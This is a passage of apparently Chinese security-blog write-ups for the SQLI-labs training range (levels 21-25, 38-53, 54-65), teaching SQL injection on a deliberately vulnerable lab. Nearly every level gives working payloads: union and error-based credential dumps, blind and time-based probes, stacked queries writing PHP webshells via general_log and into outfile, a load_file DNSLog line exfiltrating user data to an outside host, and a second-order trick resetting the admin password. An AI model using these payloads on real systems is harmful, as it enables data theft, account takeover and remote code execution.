2 3 4 5 ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;k4xoowbia1\u0026#39;),0x7e),1)--+ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(secret_D5OR) from k4xoowbia1),0x7e),1)--+ 这里我注入的表名为：k4xoowbia1，列名为：secret_D5OR\nLess-59 请求方式 注入类型 拼接方式 GET 报错、布尔盲注、延时盲注 id=$id 与 Less-58 的思路一样，只是拼接方式不一样，详见 Less-58\nLess-60 请求方式 注入类型 拼接方式 GET 报错、布尔盲注、延时盲注 id=（\u0026quot;$id\u0026quot;） 与 Less-58 注入方式一致，只是拼接方式不一样罢了，详见 Less-58\nLess-61 请求方式 注入类型 拼接方式 GET 报错、布尔盲注、延时盲注 id=(('$id')) 与 Less-58 注入方式一致，只是拼接方式不一样罢了，详见 Less-58\nLess-62 请求方式 注入类型 拼接方式 GET 布尔盲注、延时盲注 id=('$id') 此时报错也取消了，这里只能进行布尔盲注或者延时盲注了，对于盲注强烈建议使用脚本，人工太慢，在实战工程中还是靠 sqlmap 这种自动化注入神器或者自己写脚本了，手工注入的话岂不是得天荒地老。\nLess-63 请求方式 注入类型 拼接方式 GET 布尔盲注、延时盲注 id='$id' 与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62\nLess-64 请求方式 注入类型 拼接方式 GET 布尔盲注、延时盲注 id=(($id)) 与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62\nLess-65 请求方式 注入类型 拼接方式 GET 布尔盲注、延时盲注 id=(\u0026quot;$id\u0026quot;) 与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62\n参考资料 国光的SQLI labs 靶场精简学习记录 ","date":"2020-07-23T15:41:04Z","image":"https://w.wallhaven.cc/full/x6/wallhaven-x696dv.jpg","permalink":"https://360rce.github.io/p/5b8yxplu/","title":"SQLI labs 靶场笔记之进阶挑战 54-65 关"},{"content":"堆叠注入 38-53 关 原理介绍 MySQL 的命令行中，每一条语句以;结尾，这代表语句的结束，如果在注入过程中在;后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) 。下面就是简单的示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 mysql\u0026gt; select * from users where id = 1;select version(); +----+----------+----------+ | id | username | password | +----+----------+----------+ | 1 | Dumb | Dumb | +----+----------+----------+ 1 row in set (0.00 sec) +-----------+ | version() | +-----------+ | 8.0.12 | +-----------+ 1 row in set (0.00 sec) 与 union select 联合查询相比，堆叠查询更加灵活，可以执行任意的 SQL 语句。\n局限性 并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎。 在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略 这个就是为什么我们尝试用 union select 联合查询的原因，使用堆叠注入前，我们还需要了解数据库的相关信息才可以，如表名、列名等\n各个数据库堆叠查询实例 MySQL\n1 select * from users where id=1;select version(); SQL Server\n1 select 1,2,3;select * from test; Postgresql\n1 select * from user_test;select 1,2,3; 注入天书里面说 Oracle 不支持堆叠查询。\nLess-38(堆叠注入) 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注、堆叠注入 id='$id' 又到了源码简单分析的时间了，来看看堆叠注入的代码是如何实现的：\n1 2 3 4 5 6 7 # id 参数直接带入到 SQL 语句中 $id=$_GET[\u0026#39;id\u0026#39;]; $sql=\u0026#34;SELECT * FROM users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;; if (mysqli_multi_query($con1, $sql)): 输出查询信息 else: print_r(mysqli_error($con1)); 发现和之前的关卡区别不大，唯一的区别就是查询 SQL 语句由原来的：\n1 2 $sql=\u0026#34;SELECT * FROM users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;; $result=mysql_query($sql); 变成了现在的：\n1 2 $sql=\u0026#34;SELECT * FROM users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;; if (mysqli_multi_query($con1, $sql)) mysqli_multi_query 函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。这个就是堆叠注入产生的原因，因为本身就支持多个 SQL 语句。\n既然知道原理了 那么这一关就详细演示一下这个堆叠注入如何灵活使用：\n添加字段值\n1 ?id=1\u0026#39;;insert into users(username,password) values (\u0026#39;hello\u0026#39;,\u0026#39;world\u0026#39;); 数据库中查看是否添加成功：\n1 2 3 4 5 6 7 mysql\u0026gt; select * from users where username=\u0026#39;hello\u0026#39;; +----+----------+----------+ | id | username | password | +----+----------+----------+ | 15 | hello | world | +----+----------+----------+ 1 row in set (0.00 sec) 但是这个貌似并没有什么作用，但是注入天书里面也没有说其他的姿势，实际上看到这里的人应该明白后面是可以执行任意 SQL 语句的，那么这个怎么进行漏洞利用的话 就完全看你的想象力了，接下来演示我认为比较实用的姿势。\nDNSLog 数据外带 需要条件：\nMySQL 开启 load_file() DNSLog 平台 （dnslog、CEYE） Windows 平台 load_file 函数在 Linux 下是无法用来做 DNSLog 攻击的，因为在这里就涉及到 Windows 的 UNC 路径。\n其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式\n1 \\\\192.168.31.53\\test\\ CONCAT() 函数拼接了4个\\了，因为转义的原因，4个就变\\成了2个\\，目的就是利用 UNC 路径。\n因为 Linux 没有 UNC 路径这个东西，所以当 MySQL 处于 Linux 系统中的时候，是不能使用这种方式外带数据的。\n下面使用 Windows 下的 sqli-labs 测试环境：\n1 ?id=1\u0026#39;;select load_file(concat(\u0026#39;\\\\\\\\\u0026#39;,(select hex(concat_ws(\u0026#39;:\u0026#39;,username,password)) from users limit 0,1),\u0026#39;.952nzx.dnslog.cn\\\\abc\u0026#39;))--+ Hex 编码的目的就是减少干扰，因为域名是有一定的规范，有些特殊符号是不能带入的有。\n手动 Hex 解码即可\n开启日志 Getshell 需要条件：\nWeb 的物理路径 MySQL 可以读写 Web 目录 Windows 成功率 高于 Linux 首先查看当前的日志的相关配置：\n1 2 3 4 5 6 7 8 mysql\u0026gt; SHOW VARIABLES LIKE \u0026#39;general%\u0026#39;; +------------------+-----------------------------------------------------------------+ | Variable_name | Value | +------------------+-----------------------------------------------------------------+ | general_log | OFF | | general_log_file | D:\\phpstudy_pro\\Extensions\\MySQL8.0.12\\data\\DESKTOP-7FQSJGU.log | +------------------+-----------------------------------------------------------------+ 2 rows in set, 1 warning (0.00 sec) general_log环境默认是没有开启的，这里尝试注入的时候手动开启：\n1 ?id=1\u0026#39;;set global general_log = \u0026#34;ON\u0026#34;;set global general_log_file=\u0026#39;D:/phpstudy_pro/WWW/sqli.pl/Less-38/shell.php\u0026#39;;--+ 然后 MySQL 再查看日志配置是否被修改了：\n1 2 3 4 5 6 7 8 mysql\u0026gt; SHOW VARIABLES LIKE \u0026#39;general%\u0026#39;; +------------------+-----------------------------------------------+ | Variable_name | Value | +------------------+-----------------------------------------------+ | general_log | ON | | general_log_file | D:/phpstudy_pro/WWW/sqli.pl/Less-38/shell.php | +------------------+-----------------------------------------------+ 2 rows in set, 1 warning (0.00 sec) 这个尝试 getshell：\n1 ?id=1\u0026#39;;select \u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\u0026#34;; 日志里面就会记录\u0026lt;?php phpinfo();?\u0026gt;，浏览器访问查看：\nshell.php日志文件内容：\n1 2 3 4 5 6 7 8 D:\\phpstudy_pro\\COM\\..\\Extensions\\MySQL8.0.12\\\\bin\\mysqld.exe, Version: 8.0.12 (MySQL Community Server - GPL). started with: TCP Port: 3306, Named Pipe: MySQL Time Id Command Argument 2020-12-08T02:16:42.153350Z\t10 Query\t-- \u0026#39; LIMIT 0,1 2020-12-08T02:16:44.267004Z\t11 Connect\troot@localhost on security using TCP/IP 2020-12-08T02:16:44.267240Z\t11 Init DB\tsecurity 2020-12-08T02:16:44.267398Z\t11 Query\tSELECT * FROM users WHERE id=\u0026#39;1\u0026#39;; 2020-12-08T02:16:44.267695Z\t11 Query\tselect \u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\u0026#34;; Less-39 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注、堆叠注入 id=$id 和 Less-38 相比没有啥区别，只是拼接方式不一样。\n1 2 3 ?id=1;set global general_log = \u0026#34;ON\u0026#34;;set global general_log_file=\u0026#39;D:/phpstudy_pro/WWW/sqli.pl/Less-39/shell.php\u0026#39;;--+ ?id=1\u0026#39;;select \u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\u0026#34;; Less-40 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注、堆叠注入 id=('$id') 和 Less-38 相比只是拼接方式不一样。\n1 2 3 ?id=1\u0026#39;);set global general_log = \u0026#34;ON\u0026#34;;set global general_log_file=\u0026#39;D:/phpstudy_pro/WWW/sqli.pl/Less-40/shell.php\u0026#39;;--+ ?id=1\u0026#39;);select \u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\u0026#34;; 但是看了这一关源码下面还有其他文件，类似于 Less-24 的二次注入，看了下源码貌似和 Less-24 是一样的，可能是作者的疏忽吧，忘记删掉这些不相干的文件了。\nLess-41 请求方式 注入类型 拼接方式 GET 联合、布尔盲注、延时盲注、堆叠注入 id=$id 和 Less-39 类似，因为少了报错输出，所以这里不能报错注入，其他注入方式一样，这里不再赘述。\nLess-42 请求方式 注入类型 拼接方式 POST 联合、报错、布尔盲注、延时盲注、堆叠注入 username='$username' index.php 没有啥核心代码，PHP 和 HTML 混写，只要写了登录的表单，并提供了忘记密码和创建用户的链接，相比于 Less-24 的二次注入，这两个链接都不能直接访问，无法直接创建用户。\nforgot_password.php if you forgot your password,go to hack it\nacc-create.php if you need to create account,then hack your way in\nfailed.php Bug off you silly dump hacker\nlogin.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # username 被过滤 \u0026#39; \u0026#34; \\ password 没有被 $username = mysqli_real_escape_string($con1, $_POST[\u0026#34;login_user\u0026#34;]); $password = $_POST[\u0026#34;login_password\u0026#34;]; # 堆叠查询 $sql = \u0026#34;SELECT * FROM users WHERE username=\u0026#39;$username\u0026#39; and password=\u0026#39;$password\u0026#39;\u0026#34;; mysqli_multi_query($con1, $sql)) if 查询成功： return $row[1]; else: print_r(mysqli_error($con1)); if 登录成功: setcookie(\u0026#34;Auth\u0026#34;, 1, time()+3600); 跳转到 logged-in.php logged-in.php 登录成功，提供修改密码的表单\n1 \u0026lt;form name=\u0026#34;mylogin\u0026#34; method=\u0026#34;POST\u0026#34; action=\u0026#34;pass_change.php\u0026#34;\u0026gt; pass_change.php 1 2 3 4 5 6 7 8 9 10 11 if 没有登录: 重定向到 index.php if 提交了修改密码表单: $username= $_SESSION[\u0026#34;username\u0026#34;]; $curr_pass= mysql_real_escape_string($_POST[\u0026#39;current_password\u0026#39;]); $pass= mysql_real_escape_string($_POST[\u0026#39;password\u0026#39;]); $re_pass= mysql_real_escape_string($_POST[\u0026#39;re_password\u0026#39;]); if $pass==$re_pass: $sql = \u0026#34;UPDATE users SET PASSWORD=\u0026#39;$pass\u0026#39; where username=\u0026#39;$username\u0026#39; and password=\u0026#39;$curr_pass\u0026#39; \u0026#34;; 这一题漏洞比较多，首先 login.php 中 password 没有过滤，可以进行常规的报错注入以及盲注，同时本身又支持堆叠查询，所以也支持堆叠注入。 pass_change.php update 语句存在漏洞，典型的二次注入，类似于 Less-24。\n经典的万能密码绕过 1' or 1#:\n1 2 3 4 POST /Less-42/login.php HTTP/1.1 ... login_user=admin\u0026amp;login_password=1\u0026#39; or 1#\u0026amp;mysubmit=Login 因为登录成功后返回：\n1 return $row[1]; 所以登录了 id 为 1 的 Dumb 用户：\n尝试联合查询:\n1 2 3 4 POST /Less-42/login.php HTTP/1.1 ... login_user=admin\u0026amp;login_password=13141\u0026#39; union select 1,(select group_concat(username,\u0026#34;:\u0026#34;,password,0x3c62723e) from users),3#\u0026amp;mysubmit=Login 报错注入：\n1 login_user=admin\u0026amp;login_password=1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(username,\u0026#39;:\u0026#39;,password) from users limit 0,1),0x7e),1)#\u0026amp;mysubmit=Login 同理这里也可以进行盲注和堆叠查注入，这里不再赘述。\nLess-43 请求方式 注入类型 拼接方式 POST 联合、报错、布尔盲注、延时盲注、堆叠注入 username=('$username') 和 Less-42 的利用方式一致，这里只是拼接方式不一样而已，不再赘述。\nLess-44 请求方式 注入类型 拼接方式 POST 联合、布尔盲注、延时盲注、堆叠注入 username='$username' 和 Less-43 的利用方式一致，因为没有输出报错信息，所以这里少了报错注入的利用方式。\nLess-45 请求方式 注入类型 拼接方式 POST 联合、布尔盲注、延时盲注、堆叠注入 username=('$username') 与 Less-43 闭合方式一致，只是这里少了报错注入的利用方法。\nLess-46(order by后的注入) 请求方式 注入类型 拼接方式 GET 报错、布尔盲注、延时盲注 ORDER BY $id 1 2 3 4 5 6 7 8 9 10 # GET 方式获取 sort 参数 $id=$_GET[\u0026#39;sort\u0026#39;]; # 直接将 id 带入 SQL 中 $sql = \u0026#34;SELECT * FROM users ORDER BY $id\u0026#34;; if 查询成功： 输出查询信息 else： print_r(mysql_error()); order by 不同于 where 后的注入点，不能使用 union 等进行注入。注入方式十分灵活，下面在本关来详细讲解一下。\n验证方式 升序和降序验证 1 2 3 4 5 # 升序排序 ?sort=1 asc # 降序排序 ?sort=1 dasc rand() 验证 rand(ture) 和 rand(false) 的结果是不一样的\n1 2 ?sort=rand(true) ?sort=rand(false) 所以利用这个可以轻易构造出一个布尔和延时类型盲注的测试 payload\n此外 rand() 结果是一直都是随机的\n1 2 ?sort=rand() ?sort=1 and rand() 延时验证 1 2 3 ?sort=sleep(1) ?sort=(sleep(1)) ?sort=1 and sleep(1) 这种方式均可以延时，延时的时间为 (行数*1) 秒\n报错注入 爆数据库 ?sort=1 and updatexml(1,concat('~',(select group_concat(schema_name)from information_schema.schemata)),0)\n可见一次把数据库名爆不完，所以可以采用limit语句控制一次爆库名的个数\n?sort=1 and updatexml(1,concat('~',(select schema_name from information_schema.schemata limit 4,1)),0) 爆表 ?sort=1 and updatexml(1,concat('~',(select group_concat(table_name)from information_schema.tables where table_schema='security')),0) 爆users表的表列 ?sort=1 and updatexml(1,concat('~',(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='users')),0) 爆users表的数据 ?sort=1 and updatexml(1,concat('~',(select concat_ws('~',id,username,password)from security.users limit 0,1)),0) 布尔盲注 数据库第 1 位为：s\n1 2 3 4 ?sort=rand(left(database(),1)\u0026gt;\u0026#39;r\u0026#39;) ?sort=rand(left(database(),1)\u0026gt;\u0026#39;s\u0026#39;) ?sort=rand(left(database(),2)\u0026gt;\u0026#39;sd\u0026#39;) ?sort=rand(left(database(),2)\u0026gt;\u0026#39;se\u0026#39;) 延时盲注 数据库第一个字母的 ascii 码为 115，即s\n1 2 ?sort=rand(if(ascii(substr(database(),1,1))\u0026gt;114,1,sleep(1))) ?sort=rand(if(ascii(substr(database(),1,1))\u0026gt;115,1,sleep(1))) into outfile 将查询结果导入到文件中：\n1 ?sort=1 into outfile \u0026#34;D:/phpstudy_pro/WWW/sqli.pl/Less-46/less46.txt\u0026#34; 如果导入不成功的话，很可能是因为 Web 目前 MySQL 没有读写权限造成的。\n利用导出文件 getshell：\n注入天书里面提供了 lines terminated by 姿势用于 order by 的情况来 getsgell：\n1 ?sort=1 into outfile \u0026#34;D:/phpstudy_pro/WWW/sqli.pl/Less-46/shell.php\u0026#34; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e 3c3f70687020706870696e666f28293b3f3e 是 \u0026lt;php phpinfo();\u0026gt; 的十六进制编码。\n来查看下写入的文件内容是啥样子的：\n1 1\tDumb\tDumb\u0026lt;?php phpinfo();?\u0026gt;2\tAngelina\tI-kill-you\u0026lt;?php phpinfo();?\u0026gt;3\tDummy\tp@ssword\u0026lt;?php phpinfo();?\u0026gt;4\tsecure\tcrappy\u0026lt;?php phpinfo();?\u0026gt;5\tstupid\tstupidity\u0026lt;?php phpinfo();?\u0026gt;6\tsuperman\tgenious\u0026lt;?php phpinfo();?\u0026gt;7\tbatman\tmob!le\u0026lt;?php phpinfo();?\u0026gt;8\tadmin\tadmin\u0026lt;?php phpinfo();?\u0026gt;9\tadmin1\tadmin1\u0026lt;?php phpinfo();?\u0026gt;10\tadmin2\tadmin2\u0026lt;?php phpinfo();?\u0026gt;11\tadmin3\tadmin3\u0026lt;?php phpinfo();?\u0026gt;12\tdhakkan\tdumbo\u0026lt;?php phpinfo();?\u0026gt;14\tadmin4\tadmin4\u0026lt;?php phpinfo();?\u0026gt;15\thello\tworld\u0026lt;?php phpinfo();?\u0026gt; 浏览器访问测试看看：\nLess-47 请求方式 注入类型 拼接方式 GET 报错、布尔盲注、延时盲注 ORDER BY '$id' 和 Less-46 相比，利用方式不变，只是拼接方式方式变化，注入的时候只要正常闭合即可。\n1 ?sort=1\u0026#39; and updatexml(1,concat(\u0026#39;~\u0026#39;,(select concat_ws(\u0026#39;~\u0026#39;,id,username,password)from security.users limit 0,1)),0) --+ Less-48 请求方式 注入类型 拼接方式 GET 布尔盲注、延时盲注 ORDER BY $id 和 Less-46 相比少了报错注入，布尔、延时盲注依然可以正常使用，这里不再过多演示了。\nLess-49 请求方式 注入类型 拼接方式 GET 布尔盲注、延时盲注 ORDER BY '$id' 和 Less-47 相比少了报错注入，布尔、延时盲注依然可以正常使用，这里不再过多演示了。\nLess-50 请求方式 注入类型 拼接方式 GET 报错、布尔盲注、延时盲注、堆叠注入 ORDER BY $id 和 Less-46 相比，查询方式由 mysql_query 变成了 mysqli_multi_query，因此支持堆叠注入，在注入方面会更加灵活。堆叠注入的话这里不再演示，详细细节可以参考 Less-38 的堆叠注入的姿势。\nLess-51 请求方式 注入类型 拼接方式 GET 报错、布尔盲注、延时盲注、堆叠注入 ORDER BY '$id' 和 Less-50 相比只是拼接方式发生了变化，实际注入的时候只需做一下对应的闭合即可。\nLess-52 请求方式 注入类型 拼接方式 GET 布尔盲注、延时盲注、堆叠注入 ORDER BY $id 和 Less-50 是一样的，只是少了报错注入的利用方式。\nLess-53 请求方式 注入类型 拼接方式 GET 布尔盲注、延时盲注、堆叠注入 ORDER BY '$id' 和 Less-51 是一样的，只是少了报错注入的利用方式。\n","date":"2020-07-22T20:10:24Z","image":"https://w.wallhaven.cc/full/x6/wallhaven-x691gz.jpg","permalink":"https://360rce.github.io/p/cjxjnagt/","title":"SQLI labs 靶场笔记之堆叠注入 38-53 关"},{"content":"高级注入姿势 21-37 关 Less-21(Cookie Base64编码注入) 请求方式 注入类型 拼接方式 POST 联合、报错、布尔盲注、延时盲注 username=('$cookee') 简单源码分析：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php if cookie 中不存在 uname 参数: 输出了一堆无用的信息 if 提交了 uname 和 passwd: # 进行过滤 $uname = check_input($_POST[\u0026#39;uname\u0026#39;]); $passwd = check_input($_POST[\u0026#39;passwd\u0026#39;]); $sql=\u0026#34;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1\u0026#34;; if 有查询结果: # 将 uname 的值设置给 cookie 里面的 uname 参数 setcookie(\u0026#39;uname\u0026#39;, base64_encode($row1[\u0026#39;username\u0026#39;]), time()+3600); else: print_r(mysql_error()); else: if POST 数据里面没有 submit 参数: # 对 cookee 进行 base64 解密 $cookee = base64_decode($cookee); # 直接将 cookee 通过单引号拼接到 SQL 语句中 $sql=\u0026#34;SELECT * FROM users WHERE username=\u0026#39;$cookee\u0026#39; LIMIT 0,1\u0026#34;; if 查询无结果: 输出 mysql_error() if 有结果: 输出查询的信息 else: # 将 uname 的值设置给 cookie 里面的 uname 参数 setcookie(\u0026#39;uname\u0026#39;, base64_encode($row1[\u0026#39;username\u0026#39;]), time()-3600); ?\u0026gt; 从源码中分析可得，和 Less-20 基本上是一毛一样，只是 Coojie 这里是经过 base64 加密的，所以我们只需要传入加密后的 payload 给 cookie 的 uname 即可，下面就只用报错注入来简单演示一下吧：\n1 2 3 4 5 6 7 8 9 10 11 GET /Less-21/index.php HTTP/1.1 Host: sqli.pl Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://sqli.pl/Less-21/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: uname=YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB1c2VybmFtZSBmcm9tIHVzZXJzIGxpbWl0IDEsMSksMHg3ZSksMSkj Connection: close Cookie 的 uname 参数 Base64 解码为：\n1 admin\u0026#39;) and updatexml(1,concat(0x7e,(select username from users limit 1,1),0x7e),1)# 联合注入\n1 -admin\u0026#39;) union select 1,2,(select group_concat(username,\u0026#39;:\u0026#39;,password) from users) # Less-22 请求方式 注入类型 拼接方式 POST 联合、报错、布尔盲注、延时盲注 username=\u0026quot;$cookee\u0026quot; 简单源码分析：\n1 2 3 # 先双引号 然后直接拼接到SQL语句中 $cookee1 = \u0026#39;\u0026#34;\u0026#39;. $cookee. \u0026#39;\u0026#34;\u0026#39;; $sql=\u0026#34;SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1\u0026#34;; 可以发现和 Less-21 相比，只是拼接方式不一样，其他都是一致的，这里就不再啰嗦了。\n1 2 3 4 5 6 7 8 9 10 11 12 GET /Less-22/index.php HTTP/1.1 Host: sqli.pl Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://sqli.pl/Less-22/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLChzZWxlY3QgZ3JvdXBfY29uY2F0KHVzZXJuYW1lLCc6JyxwYXNzd29yZCkgZnJvbSB1c2VycykgIw== Connection: close Cookie 的 uname 参数 Base64 解码为：\n1 -admin\u0026#34; union select 1,2,(select group_concat(username,\u0026#39;:\u0026#39;,password) from users) # Less-23(过滤#、\u0026ndash;注释) 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id='$id' 简单源码分析：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # 获取到 id 的值 $id=$_GET[\u0026#39;id\u0026#39;]; # 过滤了 id 中的 # 和 -- 然后 替换为 空 $reg = \u0026#34;/#/\u0026#34;; $reg1 = \u0026#34;/--/\u0026#34;; $replace = \u0026#34;\u0026#34;; $id = preg_replace($reg, $replace, $id); $id = preg_replace($reg1, $replace, $id); # 使用单引号拼接 SQL $sql=\u0026#34;SELECT * FROM users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;; if 有查询结果: 输出查询信息 else: print_r(mysql_error()); 过滤了注释符号，但是这里还可以考虑使用闭合方式来进行注入，下面直接使用最简单的联合查询注入吧：\nPayload\n1 ?id=-1\u0026#39; union select 1,(select group_concat(username,\u0026#39;:\u0026#39;,password+SEPARATOR+0x3c62723e) from users),3 and \u0026#39;1\u0026#39;=\u0026#39;1 Less-24(二次注入) 一个经典的二次注入场景，所以下面来单个理一下源码。\n代码分析 index.php 主要记录了表单相关的信息，没有啥敏感代码，当做 Index.html 来看待就可以了，具体的界面如下：\n提示输入用户名和密码，用户名和密码正确之后就可以成功登陆，否则登陆失败。\n忘记密码：左下角的忘记密码选项提示：如果你忘记密码 请 hack it\n新建用户：右下角新建用户可以新建一个自己的用户\nfailed.php 检测会话，如果 cookie 里面没有 Auth 参数的话，就跳转到 index.php\nforgot_password.php 简单提示：如果你忘记密码 请 hack it\nLogged-in.php 登录后的信息展示，显示登录名称并且提供了修改密码的表单\nnew_user.php 创建新用户的表单页面，本文件主要存放前段代码。\nlogin_create.php 创建新用户的后端代码，下面来简单理一下代码的流程：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # 接受用户提交的用户名和密码值 并进行 mysql 安全函数转义 username= mysql_escape_string($_POST[\u0026#39;username\u0026#39;]) ; $pass= mysql_escape_string($_POST[\u0026#39;password\u0026#39;]); $re_pass= mysql_escape_string($_POST[\u0026#39;re_password\u0026#39;]); # 查询当前用户信息 $sql = \u0026#34;select count(*) from users where username=\u0026#39;$username\u0026#39;\u0026#34;; 如果当前用户已经存在 无法注册 if 两次输入密码一致： # 将记录插入数据库中 $sql = \u0026#34;insert into users ( username, password) values(\\\u0026#34;$username\\\u0026#34;, \\\u0026#34;$pass\\\u0026#34;)\u0026#34;; 查询完成后 重定向到首页 else: 提示两次输入密码不一致 login.php 1 2 3 4 # 登录用户名和密码都被过滤了 $username = mysql_real_escape_string($_POST[\u0026#34;login_user\u0026#34;]); $password = mysql_real_escape_string($_POST[\u0026#34;login_password\u0026#34;]); $sql = \u0026#34;SELECT * FROM users WHERE username=\u0026#39;$username\u0026#39; and password=\u0026#39;$password\u0026#39;\u0026#34;; pass_change.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 if 检测未登录： 重定向到首页 if 检测到提交表单： # 对 pass 都进行了过滤 $username= $_SESSION[\u0026#34;username\u0026#34;]; $curr_pass= mysql_real_escape_string($_POST[\u0026#39;current_password\u0026#39;]); $pass= mysql_real_escape_string($_POST[\u0026#39;password\u0026#39;]); $re_pass= mysql_real_escape_string($_POST[\u0026#39;re_password\u0026#39;]); if 两次密码一致: # 直接将 username 拼接到 SQL 语句 $sql = \u0026#34;UPDATE users SET PASSWORD=\u0026#39;$pass\u0026#39; where username=\u0026#39;$username\u0026#39; and password=\u0026#39;$curr_pass\u0026#39; \u0026#34;; else: 提示密码不一致 并重定向到 fail.php 思路分析 从代码上来看貌似都被转义了，乍一看是成功注入的。实际上的确不能使用常规的思路来进行注入，因为这题是二次注入，ISCC 2019 当时使用这题的考查点是修改掉 admin 用户的密码，然后再登录即可。假设不知道 admin 用户的情况下，想要修改掉 admin 用户的密码的话，这里就使用的是二次注入的姿势了。\n二次注入 简单概括就是黑客精心构造 SQL 语句插入到数据库中，数据库报错的信息被其他类型的 SQL 语句调用的时候触发攻击行为。因为第一次黑客插入到数据库的时候并没有触发危害性，而是再其他语句调用的时候才会触发攻击行为，这个就是二次注入。\n先看创建用户的地方：\n1 username = mysql_escape_string($_POST[\u0026#39;username\u0026#39;]) ; username 被 mysql_escape_string 函数过滤了，该函数的作用如下：\n危险字符 转义后 \\ \\\\ ' \\' \u0026quot; \\\u0026quot; 再看下更新密码的核心语句：\n1 UPDATE users SET PASSWORD=\u0026#39;$pass\u0026#39; where username=\u0026#39;$username\u0026#39; and password=\u0026#39;$curr_pass\u0026#39; 这里直接使用单引号拼接了 username 所以当 username 可控的话 ，这里是存在SQL注入的，假设用户注册的 username 的值为：admin'#，那么此时的完整语句就为：\n1 UPDATE users SET PASSWORD=\u0026#39;$pass\u0026#39; where username=\u0026#39;admin\u0026#39;# and password=\u0026#39;$curr_pass\u0026#39; 此时就完全改变了语义，直接就修改掉了 admin 用户的密码。\n步骤演示 常见一个admin'#开头的用户名，下面列举的几种都可以，以此类推，很灵活：\n1 2 3 4 admin\u0026#39;#1 admin\u0026#39;#233 admin\u0026#39;#gg ... 注册完成后数据库的记录信息如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 mysql\u0026gt; select * from users; +----+------------+----------+ | id | username | password | +----+------------+----------+ | 1 | Dumb | 0 | | 2 | Angelina | 0 | | 3 | Dummy | 0 | | 4 | secure | 0 | | 5 | stupid | 0 | | 6 | superman | 0 | | 7 | batman | 0 | | 8 | admin | 0 | | 9 | admin1 | 0 | | 10 | admin2 | 0 | | 11 | admin3 | 0 | | 12 | dhakkan | 0 | | 14 | admin4 | 0 | | 15 | admin\u0026#39;#sec | 123 | +----+------------+----------+ 14 rows in set (0.00 sec) 成功添加了记录，这里单引号数据库中中看没有被虽然转义了，这是因为转义只不过是暂时的，最后存入到数据库的时候还是没变的。\n接下来登录 `admin\u0026rsquo;#sec用户，然后来修改当前的密码：\n此时来数据库中查看，可以发现成功修改掉了 admin 用的密码了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 mysql\u0026gt; select * from users; +----+------------+----------+ | id | username | password | +----+------------+----------+ | 1 | Dumb | 0 | | 2 | Angelina | 0 | | 3 | Dummy | 0 | | 4 | secure | 0 | | 5 | stupid | 0 | | 6 | superman | 0 | | 7 | batman | 0 | | 8 | admin | 1234 | | 9 | admin1 | 0 | | 10 | admin2 | 0 | | 11 | admin3 | 0 | | 12 | dhakkan | 0 | | 14 | admin4 | 0 | | 15 | admin\u0026#39;#sec | 123 | +----+------------+----------+ 14 rows in set (0.00 sec) Less-25(过滤or和and) 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id='$id' 关键代码分析： 1 2 3 4 5 6 7 # id 直接单引号拼接 $sql=\u0026#34;SELECT * FROM users WHERE id=\u0026#39;$id\u0026#39; LIMIT 